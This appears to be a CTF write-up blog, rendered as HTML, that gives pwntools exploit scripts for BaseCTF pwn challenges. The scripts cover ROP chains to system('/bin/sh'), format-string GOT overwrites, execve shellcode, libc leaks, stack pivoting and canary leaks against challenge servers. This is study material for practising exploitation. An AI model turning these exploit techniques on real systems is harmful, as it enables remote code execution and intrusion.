class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = process(&quot;./pwn&quot;)</span><br>p=remote(<span class="hljs-string">&quot;challenge.basectf.fun&quot;</span>,<span class="hljs-number">47345</span>)<br><br>pop_rdi = <span class="hljs-number">0x401196</span><br>system = <span class="hljs-number">0x40120f</span><br>binsh = <span class="hljs-number">0x402008</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">120</span>+p64(pop_rdi)+p64(binsh)+p64(system)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="Week1-签个到吧"><a href="#Week1-签个到吧" class="headerlink" title="[Week1] 签个到吧"></a>[Week1] 签个到吧</h2><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc ip port<br></code></pre></td></tr></table></figure><h2 id="Week2-format-string-level0"><a href="#Week2-format-string-level0" class="headerlink" title="[Week2] format_string_level0"></a>[Week2] format_string_level0</h2><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br><span class="hljs-comment">#p = process(&quot;./vuln&quot;)</span><br>p = remote(<span class="hljs-string">&quot;challenge.basectf.fun&quot;</span>,<span class="hljs-number">40075</span>)<br>elf = ELF(<span class="hljs-string">&quot;./vuln&quot;</span>)<br><br>payload = <span class="hljs-string">b&quot;%p &quot;</span>*<span class="hljs-number">7</span> + <span class="hljs-string">b&quot;\n%s&quot;</span><br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="Week2-format-string-level1"><a href="#Week2-format-string-level1" class="headerlink" title="[Week2] format_string_level1"></a>[Week2] format_string_level1</h2><h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>,<span class="hljs-string">&quot;splitw&quot;</span>,<span class="hljs-string">&quot;-h&quot;</span>]<br><br><span class="hljs-comment">#p = process(&quot;./vuln&quot;)</span><br>p = remote(<span class="hljs-string">&quot;challenge.basectf.fun&quot;</span>,<span class="hljs-number">27841</span>)<br>elf = ELF(<span class="hljs-string">&quot;./vuln&quot;</span>)<br><br>target = <span class="hljs-number">0x4040B0</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>payload = <span class="hljs-string">b&quot;%p&quot;</span>*<span class="hljs-number">7</span> + <span class="hljs-string">b&quot;%n&quot;</span> + p64(target)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="Week2-gift"><a href="#Week2-gift" class="headerlink" title="[Week2] gift"></a>[Week2] gift</h2><h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-comment"># context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span><br><br>p = process(<span class="hljs-string">&quot;./gift&quot;</span>)<br><span class="hljs-comment"># p = remote(&quot;challenge.basectf.fun&quot;,35040)</span><br>elf = ELF(<span class="hljs-string">&quot;./gift&quot;</span>)<br><br>syscall = <span class="hljs-number">0x0000000000401ce4</span><br>pop_rdi = <span class="hljs-number">0x0000000000401f2f</span> <span class="hljs-comment"># pop rdi ; ret</span><br>pop_rsi = <span class="hljs-number">0x0000000000409f9e</span> <span class="hljs-comment"># pop rsi ; ret</span><br>pop_rdx_rbx = <span class="hljs-number">0x000000000047f2eb</span> <span class="hljs-comment"># pop rdx ; pop rbx ; ret</span><br>pop_rax = <span class="hljs-number">0x0000000000419484</span> <span class="hljs-comment"># pop rax ; ret</span><br>mov_rsi_rax = <span class="hljs-number">0x000000000044a5e5</span> <span class="hljs-comment"># mov qword ptr [rsi], rax ; ret</span><br>addr = <span class="hljs-number">0x4c6500</span> <br><br>payload  = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">40</span><br>payload += p64(pop_rsi) + p64(addr) + p64(pop_rax) + <span class="hljs-string">b&#x27;/bin/sh\0&#x27;</span> + p64(mov_rsi_rax)<br>payload += p64(pop_rdi) + p64(addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(pop_rdx_rbx) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(pop_rax) + p64(<span class="hljs-number">59</span>) + p64(syscall)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="Week2-shellcode-level1"><a href="#Week2-shellcode-level1" class="headerlink" title="[Week2] shellcode_level1"></a>[Week2] shellcode_level1</h2><h3 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment">#p = process(&quot;./attachment&quot;)</span><br>p = remote(<span class="hljs-string">&#x27;challenge.basectf.fun&#x27;</span>,<span class="hljs-number">20515</span>)<br>elf = ELF(<span class="hljs-string">&quot;./attachment&quot;</span>)<br><br>payload = asm(<span class="hljs-string">&#x27;syscall&#x27;</span>)<br>p.send(payload)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">2</span><br>payload += asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        mov rbx, 0x0068732f6e69622f</span><br><span class="hljs-string">        push rbx</span><br><span class="hljs-string">        mov rdi,rsp</span><br><span class="hljs-string">        mov rsi,0</span><br><span class="hljs-string">        mov rdx,0</span><br><span class="hljs-string">        mov rax,59</span><br><span class="hljs-string">        syscall </span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="Week2-她与你皆失"><a href="#Week2-她与你皆失" class="headerlink" title="[Week2] 她与你皆失"></a>[Week2] 她与你皆失</h2><h3 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>,<span class="hljs-string">&quot;splitw&quot;</span>,<span class="hljs-string">&quot;-h&quot;</span>]<br><br><span class="hljs-comment">#p = process(&quot;./pwn&quot;)</span><br>p = remote(<span class="hljs-string">&quot;challenge.basectf.fun&quot;</span>,<span class="hljs-number">49599</span>)<br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><br>main = <span class="hljs-number">0x4011E3</span><br>pop_rdi = <span class="hljs-number">0x0000000000401176</span> <span class="hljs-comment"># pop rdi ; ret</span><br>pop_rdx = <span class="hljs-number">0x0000000000401221</span> <span class="hljs-comment"># pop rdx ; ret</span><br>pop_rsi = <span class="hljs-number">0x0000000000401178</span> <span class="hljs-comment"># pop rsi ; ret</span><br>ret = <span class="hljs-number">0x000000000040101a</span> <span class="hljs-comment"># ret</span><br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>p.recvuntil(<span class="hljs-string">&quot;do?\n&quot;</span>)<br>payload  = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">18</span><br>payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)<br>p.send(payload)<br>puts_addr = u64(p.recv()[:<span class="hljs-number">6</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>))<br>log.success(<span class="hljs-string">&quot;puts_addr -&gt; &quot;</span> + <span class="hljs-built_in">hex</span>(puts_addr))<br><br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br><br>payload  = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">18</span><br>payload += p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system_addr)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="Week3-PIE"><a href="#Week3-PIE" class="headerlink" title="[Week3] PIE"></a>[Week3] PIE</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>libc_start_call_main中一个神奇的gadget<br>改掉main函数的返回地址的最后一个byte即可调用到改gadget<br>从而再run一次main函数</p><h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-comment"># context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span><br><br>p = process(<span class="hljs-string">&quot;./vuln&quot;</span>)<br><span class="hljs-comment"># p = remote(&quot;challenge.basectf.fun&quot;,20318)</span><br>elf = ELF(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><br><span class="hljs-comment"># 0x0000000000029d89 : mov rax, qword ptr [rsp + 8] ; call rax</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">256</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span> + <span class="hljs-string">b&#x27;\x89&#x27;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>leak = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = leak - <span class="hljs-number">0x029d89</span><br>log.success(<span class="hljs-string">&quot;libc_base -&gt; &quot;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>system_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = libc_base + libc.search(<span class="hljs-string">&quot;/bin/sh\0&quot;</span>).__next__()<br>pop_rdi = libc_base + <span class="hljs-number">0x000000000002a3e5</span> <span class="hljs-comment"># pop rdi ; ret</span><br>ret = pop_rdi + <span class="hljs-number">1</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">256</span>+ <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span> + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system_addr)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="Week3-format-string-level2"><a href="#Week3-format-string-level2" class="headerlink" title="[Week3] format_string_level2"></a>[Week3] format_string_level2</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>利用格式化字符串漏洞修改printf_got</p><h3 id="exp-12"><a href="#exp-12" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>,<span class="hljs-string">&quot;splitw&quot;</span>,<span class="hljs-string">&quot;-h&quot;</span>]<br><br><span class="hljs-comment">#p = process(&quot;./format_string_level2&quot;)</span><br>p = remote(<span class="hljs-string">&quot;challenge.basectf.fun&quot;</span>,<span class="hljs-number">39839</span>)<br>elf = ELF(<span class="hljs-string">&quot;./format_string_level2&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br><br>printf_plt = elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>printf_got = elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br><br>payload = <span class="hljs-string">b&quot;%7$saaaa&quot;</span> + p64(printf_got)<br>p.send(payload)<br>printf_addr = u64(p.recv()[:<span class="hljs-number">6</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">&quot;printf_addr -&gt; &quot;</span> + <span class="hljs-built_in">hex</span>(printf_addr))<br><br>libc_base = printf_addr - <span class="hljs-number">0x0606f0</span><br>log.success(<span class="hljs-string">&quot;libc_base -&gt; &quot;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>system_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>system_byte = [<br>        (p64(system_addr)[<span class="hljs-number">0</span>],<span class="hljs-number">0</span>),<br>        (p64(system_addr)[<span class="hljs-number">1</span>],<span class="hljs-number">1</span>),<br>        (p64(system_addr)[<span class="hljs-number">2</span>],<span class="hljs-number">2</span>),<br>        ]<br><br>system_byte = <span class="hljs-built_in">sorted</span>(system_byte)<br><span class="hljs-built_in">print</span>(system_byte)<br><span class="hljs-comment">#assert system_byte[0][0]&lt;system_byte[1][0]&lt;system_byte[2][0]&lt;system_byte[3][0]&lt;system_byte</span><br><span class="hljs-keyword">assert</span> system_byte[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] &lt; (<span class="hljs-number">256</span>-<span class="hljs-number">0x18</span>-<span class="hljs-number">7</span>)<br><br>payload = system_byte[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]*<span class="hljs-string">b&#x27;a&#x27;</span><br>payload += <span class="hljs-string">b&quot;%35$hhn&quot;</span><br>payload = payload.ljust(system_byte[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]+<span class="hljs-number">7</span>,<span class="hljs-string">b&#x27;b&#x27;</span>)<br>payload += <span class="hljs-string">b&quot;%36$hhn&quot;</span><br>payload = payload.ljust(system_byte[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>]+<span class="hljs-number">14</span>,<span class="hljs-string">b&#x27;c&#x27;</span>)<br>payload += <span class="hljs-string">b&quot;%37$hhn&quot;</span><br>payload = payload.ljust(<span class="hljs-number">256</span>-<span class="hljs-number">0x18</span>,<span class="hljs-string">b&#x27;d&#x27;</span>)<br>payload += p64(printf_got+system_byte[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]) + p64(printf_got+system_byte[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]) + p64(printf_got+system_byte[<span class="hljs-number">2</span>][<span class="hljs-number">1</span>])<br><br>p.send(payload)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;d&#x27;</span>)<br>p.send(<span class="hljs-string">b&#x27;/bin/sh\0&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="Week3-stack-in-stack"><a href="#Week3-stack-in-stack" class="headerlink" title="[Week3] stack_in_stack"></a>[Week3] stack_in_stack</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>简单的栈迁移</p><h3 id="exp-13"><a href="#exp-13" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>,<span class="hljs-string">&quot;splitw&quot;</span>,<span class="hljs-string">&quot;-h&quot;</span>]<br><br><span class="hljs-comment">#p = process(&quot;./attachment&quot;)</span><br>p = remote(<span class="hljs-string">&quot;challenge.basectf.fun&quot;</span>,<span class="hljs-number">37492</span>)<br>elf = ELF(<span class="hljs-string">&quot;./attachment&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><br>leave_ret = <span class="hljs-number">0x4012F2</span><br>secert = <span class="hljs-number">0x4011DD</span><br>read = <span class="hljs-number">0x4012B5</span><br>ret = <span class="hljs-number">0x4012F3</span><br>p.recvuntil(<span class="hljs-string">b&#x27;mick0960.\n&#x27;</span>)<br>buf = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>log.success(<span class="hljs-string">&quot;buf -&gt; &quot;</span> + <span class="hljs-built_in">hex</span>(buf))<br><br>payload  = p64(<span class="hljs-number">0</span>) + p64(secert) + p64(buf+<span class="hljs-number">0x30</span>) + p64(read)<br>payload  = payload.ljust(<span class="hljs-number">48</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload += p64(buf) + p64(leave_ret) <br>p.send(payload)<br>puts_addr = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>log.success(<span class="hljs-string">&quot;puts_addr -&gt; &quot;</span> + <span class="hljs-built_in">hex</span>(puts_addr))<br><br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_rdi = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdi;ret;&#x27;</span>)))<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&quot;/bin/sh\0&quot;</span>))<br><br>payload  = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">24</span> + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="Week3-五子棋"><a href="#Week3-五子棋" class="headerlink" title="[Week3] 五子棋"></a>[Week3] 五子棋</h2><h3 id="exp-14"><a href="#exp-14" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># context.log_level = &quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>,<span class="hljs-string">&quot;splitw&quot;</span>,<span class="hljs-string">&quot;-h&quot;</span>]<br><br>p = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-comment">#p = remote()</span><br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br><br>p.sendline(<span class="hljs-string">b&#x27;0 0&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;0 -5965&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="Week3-你为什么不让我溢出"><a href="#Week3-你为什么不让我溢出" class="headerlink" title="[Week3] 你为什么不让我溢出"></a>[Week3] 你为什么不让我溢出</h2><h3 id="exp-15"><a href="#exp-15" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>,<span class="hljs-string">&quot;splitw&quot;</span>,<span class="hljs-string">&quot;-h&quot;</span>]<br><br><span class="hljs-comment">#p = process(&quot;./你为什么不让我溢出&quot;)</span><br>p = remote(<span class="hljs-string">&quot;challenge.basectf.fun&quot;</span>,<span class="hljs-number">20411</span>)<br>elf = ELF(<span class="hljs-string">&quot;./你为什么不让我溢出&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br><br>getshell = <span class="hljs-number">0x4011BE</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">100</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">5</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">5</span>)<br>canary = u64(p.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">&quot;canary -&gt; &quot;</span> + <span class="hljs-built_in">hex</span>(canary))<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">104</span> + p64(canary) + p64(<span class="hljs-number">0</span>) + p64(getshell)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="Week4-ezstack"><a href="#Week4-ezstack" class="headerlink" title="[Week4] ezstack"></a>[Week4] ezstack</h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>ret2dl_resolve</p><h3 id="exp-16"><a href="#exp-16" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 